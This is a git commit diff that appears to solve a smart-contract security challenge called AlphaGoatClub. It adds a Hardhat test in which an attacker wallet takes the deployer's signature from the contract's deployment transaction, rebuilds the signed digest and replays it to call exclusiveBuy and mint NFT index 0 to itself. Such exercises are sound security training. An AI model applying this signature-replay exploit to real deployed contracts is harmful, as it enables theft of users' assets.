18aae93d01b6c1aabf3d800a876ec48e73259dca
hazem-dh <hazemdhaou.it@gmail.com>
2025-07-29 21:47:27 +0200

    Solved AlphaGoatClub

--- test/AlphaGoatClub.js
+++ test/AlphaGoatClub.js
@@ -28,6 +28,33 @@ describe(NAME, function () {
             /**
              * The goal is to use the attacker wallet to mint the NFT at index 0 to itself.
              */
+            const pending = await AlphaGoatClub.connect(attacker).commit();
+            for (let i = 0; i < 5; i++) {
+                await network.provider.send("evm_mine");
+            }
+            const txHash = AlphaGoatClub.deployTransaction.hash;
+            const tx = await ethers.provider.getTransaction(txHash);
+            const unsignedTx = {
+                type: 2,
+                nonce: tx.nonce,
+                to: tx.to,
+                value: tx.value,
+                data: tx.data,
+                chainId: tx.chainId,
+                gasLimit: tx.gasLimit,
+                maxFeePerGas: tx.maxFeePerGas,
+                maxPriorityFeePerGas: tx.maxPriorityFeePerGas,
+            };
+            // Compute the digest (hash) that was signed
+            const hash = ethers.utils.keccak256(ethers.utils.serializeTransaction(unsignedTx));
+            // Reconstruct the ECDSA signature from r, s, v
+            const signature = ethers.utils.joinSignature({
+                r: tx.r,
+                s: tx.s,
+                v: tx.v,
+            });
+
+            await AlphaGoatClub.connect(attacker).exclusiveBuy(0, hash, signature);
         });
 
         after(async function () {
